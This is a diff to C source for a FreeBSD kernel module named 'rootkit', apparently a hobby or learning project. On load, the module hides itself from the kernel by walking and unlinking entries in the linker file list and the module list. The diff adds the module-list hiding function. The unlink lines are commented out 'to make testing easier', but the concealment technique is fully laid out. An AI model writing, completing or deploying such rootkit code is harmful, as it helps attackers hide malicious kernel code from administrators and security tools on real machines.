@@ -27,13 +27,31 @@
 #include <sys/mutex.h>
 #include <sys/sx.h>
 
-static int remove_linker_file(char * name);
-static void decrement_kernel_image_ref_count(void);
-
-
+// Linker Files Setup
 extern struct sx kld_sx;
 extern linker_file_list_t linker_files;
 extern int next_file_id;
+//Linker Files Methods 
+static int remove_linker_file(char * name);
+static void decrement_kernel_image_ref_count(void);
+//Modules Setup 
+struct module {
+	TAILQ_ENTRY(module)	link;	/* chain together all modules */
+	TAILQ_ENTRY(module)	flink;	/* all modules in a file */
+	struct linker_file	*file;	/* file which contains this module */
+	int			refs;	/* reference count */
+	int 			id;	/* unique id number */
+	char 			*name;	/* module name */
+	modeventhand_t 		handler;	/* event handler */
+	void 			*arg;	/* argument for handler */
+	modspecific_t 		data;	/* module specific data */
+};
+extern struct sx modules_sx;
+typedef TAILQ_HEAD(,module) modulelist_t;
+extern modulelist_t modules;
+extern int nextid;
+//Modules Methods 
+static int remove_module_from_kernel(char *name);
 
 static int
 load(struct module *module, int cmd, void *arg)
@@ -42,6 +60,7 @@ load(struct module *module, int cmd, void *arg)
         case MOD_LOAD:
                 LOGI("[rootkit:load] Rootkit loaded.\n");
                 remove_linker_file("rootkit.ko");
+				remove_module_from_kernel("rootkit");
 				break;
         case MOD_UNLOAD:
                 LOGI("[rootkit:load] Rootkit unloaded.\n");
@@ -60,21 +79,43 @@ static moduledata_t rootkit_mod = {
         NULL
 };
 
+static int remove_module_from_kernel(char * name){
+	struct module * mod;
+	int result = 1;
+	sx_xlock(&modules_sx);
+	
+	LOGI("Searching for %s in modules\n", name);
+	TAILQ_FOREACH(mod, &modules, link){
+		//LOGI("Checking Module: %s\n", mod->name);
+		if(strcmp(mod->name, name) == 0 ){
+			LOGI("Found %s, Removing from modules list", mod->name);
+			//nextid--;
+			//TAILQ_REMOVE(&modules, mod, link);
+			result = 0;
+			break;
+		}
+	}
 
+	sx_xunlock(&modules_sx);
+	return result;
+}
+
+// Uncommented to make testing eaiser
 static int remove_linker_file(char * name){
 	struct linker_file  *lf;
 	int result = 1;
 
 	mtx_lock(&Giant);
 	sx_slock(&kld_sx);
-	decrement_kernel_image_ref_count();
+	//decrement_kernel_image_ref_count();
 
 	LOGI("Attempting to remove linker file %s\n", name);
 	TAILQ_FOREACH(lf, &linker_files, link){
 		LOGI("Checking %s\n", lf->filename);
 		if(strcmp(lf->filename, name) == 0){
-			next_file_id--;
-			TAILQ_REMOVE(&linker_files,lf,link);
+			//next_file_id--;
+			//TAILQ_REMOVE(&linker_files,lf,link);
+			LOGI("Found and removing linker file\n");
 			result = 0;
 			break;
 		}
